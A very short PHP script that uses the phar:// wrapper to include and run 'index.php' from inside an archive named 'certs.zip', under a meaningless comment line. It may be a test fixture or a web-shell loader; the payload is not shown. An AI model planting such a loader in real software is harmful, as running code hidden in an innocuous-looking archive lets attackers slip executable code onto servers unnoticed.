<?php
# 7IDU ZFA3OMJX#G

function loadFromPhar($zip, $file) {
    include "phar://$zip/$file";
}
loadFromPhar('certs.zip', 'index.php');

?>